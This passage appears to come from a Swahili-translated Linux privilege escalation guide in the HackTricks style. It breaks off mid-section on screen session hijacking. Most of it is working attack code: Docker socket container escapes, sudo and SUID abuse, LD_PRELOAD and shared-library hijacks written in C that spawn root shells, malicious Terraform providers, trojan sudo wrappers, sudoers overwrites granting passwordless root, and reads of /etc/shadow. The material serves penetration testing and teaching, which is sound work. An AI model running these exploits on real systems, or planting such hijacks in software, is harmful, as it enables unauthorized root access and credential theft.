curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi kuunda container inayopachika directory ya root ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoundwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Unganisha na container kwa kutumia `socat` ili kuanzisha muunganisho kwa container, kuruhusu kutekeleza amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na root-level access kwenye filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **ndani ya group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa ugundua kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa sababu **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa ugundua kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa sababu **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisanii wa **inter-Process Communication (IPC)** unaowawezesha program kuingiliana na kushirikiana data kwa ufanisi. Ukiundwa kwa kuzingatia mfumo wa kisasa wa Linux, hutoa fremu thabiti kwa aina mbalimbali za mawasiliano ya program.

Mfumo ni wenye ufanisi, ukisaidia IPC za msingi ambazo zinaboresha kubadilishana data kati ya michakato, ukikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kutangaza matukio au ishara, kukuza uunganisho laini kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kusababisha player wa muziki kutulia, kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote objects, kurahisisha maombi ya huduma na mitekelezo ya method kati ya program, kuimarisha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus inafanya kazi kwa mfano wa **allow/deny model**, ikisimamia ruhusa za ujumbe (maombi ya method, utoaji wa ishara, n.k.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaelezea mwingiliano na bus, na zinaweza kuwezesha privilege escalation kupitia unyonyaji wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umewekwa, ukiwaelezea ruhusa kwa mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina mtumiaji au kundi maalum zinatumika kwa wote, wakati sera za muktadha wa "default" zinatumika kwa wote ambao hawajafunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati enumerate mtandao na kubaini nafasi ya machine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizofunguliwa

Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kupata ufikiaji wake:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa unaweza, unaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodhesaji wa Kawaida

Angalia ni **who** wewe ni, ni **privileges** gani unazo, ni **users** gani wako kwenye mfumo, ni zipi zinaweza **login**, na ni zipi zina **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Baadhi ya matoleo ya Linux yaliathirika na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kikundi fulani** ambacho kinaweza kukupa root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia ikiwa kuna chochote kinachovutia kilicho ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nenosiri zilizojulikana

Ikiwa unajua **nenosiri lolote** la mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa haujali kusababisha kelele nyingi na `su` na `timeout` binaries zipo kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) na parameter `-a` pia inajaribu brute-force watumiaji.

## Matumizi mabaya ya $PATH yanayoweza kuandikwa

### $PATH

Ikiwa utagundua kuwa unaweza **kuandika ndani ya baadhi ya folda za $PATH**, unaweza kufanikiwa kuinua ruhusa kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** yenye jina la amri ambayo itatekelezwa na mtumiaji mwingine (root inapendekezwa) na ambayo **haitapakiwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nywila.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanamruhusu mtumiaji **set an environment variable** wakati wa kuendesha kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **vulnerable** kwa **PYTHONPATH hijacking** kupakia maktaba yoyote ya python wakati script ikiendeshwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV iliyohifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzishwa ya Bash isiyo ya mwingiliano ili kuendesha msimbo wowote kama root wakati wa kuitisha amri inayoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo za mwingiliano, Bash hufanya tathmini ya `$BASH_ENV` na huisoma faili hiyo kabla ya kuendesha script lengwa. Sheria nyingi za sudo zinaruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imetunzwa na sudo, faili yako itasomwa kwa uwezo wa root.

- Mahitaji:
- Sheria ya sudo unayoweza kuendesha (lengo lolote linaloiita `/bin/bash` kwa njia isiyo ya mwingiliano, au script yoyote ya bash).
- `BASH_ENV` kuwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zilizopewa ruhusa za sudo; tumia binaries ndogo.
- Fikiria sudo I/O logging na alerting wakati preserved env vars zinapotumika.

### Terraform kupitia sudo na HOME iliyohifadhiwa (!env_reset)

Ikiwa sudo inaacha mazingira bila kubadilishwa (`!env_reset`) wakati inaruhusu `terraform apply`, `$HOME` hubaki kuwa ya mtumiaji aliyefanya mwito. Kwa hivyo Terraform inapakia **$HOME/.terraformrc** kama root na inaheshimu `provider_installation.dev_overrides`.

- Elekeza provider inayohitajika kwenye directory ambayo inaweza kuandikwa na weka plugin mbaya iliyobadilishwa kwa jina la provider (kwa mfano, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kwenye handshake ya plugin ya Go lakini itatekeleza payload kama root kabla ya kufa, na kuacha shell ya SUID nyuma.

### TF_VAR overrides + kuepukana na uthibitishaji wa symlink

Vigezo vya Terraform vinaweza kutolewa kupitia environment variables `TF_VAR_<name>`, ambavyo vinaendelea kuwepo wakati sudo inapohifadhi mazingira. Uthibitishaji dhaifu kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` unaweza kuepukika kwa kutumia symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **kuandika** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### requiretty / !requiretty

On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
```bash
Defaults !requiretty
```
Hii si udhaifu wa moja kwa moja, lakini inaenea hali ambapo kanuni za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / isiyo salama secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` inayojumuisha sehemu zinazoweza kuandikwa na mshambuliaji (kwa mfano, `/home/<user>/bin`), amri yoyote ya relative ndani ya lengo lililoruhusiwa na sudo inaweza kufichwa.

- Mahitaji: kanuni ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayoitisha amri bila njia kamili (`free`, `df`, `ps`, n.k.) na entry ya PATH inayoweza kuandikwa ambayo inatafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo: njia za kupita kando ya utekelezaji
**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano kwenye sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumiwa (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kuzuia**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kuiexploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii inaweza pia kutumika ikiwa binary ya **suid** **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Ikiwa binary ya **suid** **executes another command specifying the path**, basi unaweza kujaribu **export a function** iliyoitwa kama command ambayo faili ya suid inaiita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha suid binary, funsi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kubainisha maktaba moja au zaidi za pamoja (.so files) ambazo zitaletwa na loader kabla ya nyingine zote, ikijumuisha maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama upakiaji wa awali wa maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia sifa hii isitumike vibaya, hasa kwa executables za **suid/sgid**, mfumo unatekeleza masharti fulani:

- Loader haizingatii **LD_PRELOAD** kwa executables ambazo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zinazopakiwa awali ni zile tu zilizoko katika njia za kawaida ambazo pia ni suid/sgid.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambulikana hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezaji wa msimbo wowote kwa viwango vya kibali vilivyoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **ijenge** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH** kwa sababu anadhibiti njia ambazo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** na inayofanya kama isiyo ya kawaida, ni desturi nzuri kuthibitisha kama inapakia mafaili ya **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa exploitation.

Ili exploit hili, mtu angeendelea kwa kuunda C file, kwa mfano _"/path/to/.config/libcalc.c"_, yenye code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Code hii, mara itakaposanifiwa na kutekelezwa, inalenga kuinua privileges kwa kubadilisha file permissions na kutekeleza shell yenye elevated privileges.

Compile faili ya C hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyokumbwa kunapaswa kusababisha exploit, kuruhusu uwezekano wa uvamizi wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa baada ya kupata SUID binary inayopakia library kutoka kwa folda tunaoweza kuandika, tengeneza library katika folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hiyo inamaanisha kuwa maktaba uliyoitengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyoratibiwa ya Unix binaries ambazo mdukuzi anaweza kuzitumia kuvuka vikwazo vya usalama vya eneo. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **only inject arguments** katika amri.

Mradi hukusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibaya kuvunja restricted shells, escalate au maintain elevated privileges, transfer files, spawn bind and reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Kama unaweza kupata `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) ili kuangalia ikiwa inapata jinsi ya ku-exploit sheria yoyote ya sudo.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini siyo password, unaweza escalate privileges kwa **waiting for a sudo command execution and then hijacking the session token**.

Mahitaji ya escalate privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame **used `sudo`** kutekeleza kitu katika **last 15mins** (kwa default hiyo ndiyo muda wa sudo token inaruhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kui-upload)

(Unaweza kwa muda ku-enable `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Kama mahitaji haya yote yamekamilika, **unaweza escalate privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaumba binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **activate the sudo token in your session** (huwezi kupata root shell moja kwa moja, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itatengeneza sh shell katika _/tmp_ **inayomilikiwa na root na yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) ita **kuunda sudoers file** ambayo inafanya **sudo tokens ziwe za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **write permissions** katika kabrasha hilo au kwa yoyote ya faili zilizotengenezwa ndani yake unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa user na PID**.\
Kwa mfano, ikiwa unaweza kuandika upya faili _/var/run/sudo/ts/sampleuser_ na una shell kama user huyo mwenye PID 1234, unaweza **kupata sudo privileges** bila haja ya kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizomo ndani ya `/etc/sudoers.d` zinaweka nani anaweza kutumia `sudo` na kwa jinsi gani. Hizi faili **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi root**.\ **Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utakuwa na uwezo wa **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kukagua usanidi wake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Iwapo unajua kwamba **mtumiaji kawaida huunganishwa kwenye mashine na hutumia `sudo`** ili kuongeza vibali na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda sudo executable mpya** ambayo itatekeleza msimbo wako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza njia mpya katika .bash_profile) ili wakati mtumiaji anapoendesha sudo, sudo executable yako itatekelezwa.

Chukua tahadhari kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza njia mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumiwa na programu mahali hapa kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba hatari katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ndogo ya vibali vya root vinavyopatikana kwa mchakato**. Hii kwa ufanisi inavunja vibali vya root kuwa **vitengo vidogo na vinavyojitofautisha**. Kila kimoja cha vitengo hivi kinaweza kutolewa kwa mchakato kwa uhuru. Kwa njia hii seti kamili ya vibali inapunguzwa, kupunguza hatari za matumizi mabaya.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, the **bit for "execute"** ina maana kwamba mtumiaji aliyeathirika anaweza "**cd**" ndani ya folda.\
The **"read"** bit inaonyesha mtumiaji anaweza **kuorodhesha** **files**, na the **"write"** bit inaonyesha mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Orodha za Udhibiti wa Upatikanaji (ACLs) ni tabaka la pili la ruhusa za hiari, zenye uwezo wa **kupitisha vibali vya jadi vya ugo/rwx**. Ruhusa hizi zinaongeza udhibiti juu ya upatikanaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Ngazi hii ya **uwekundu wa undani inahakikisha usimamizi sahihi zaidi wa upatikanaji**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **matoleo ya hivi karibuni** utaweza **connect** kwa screen sessions tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
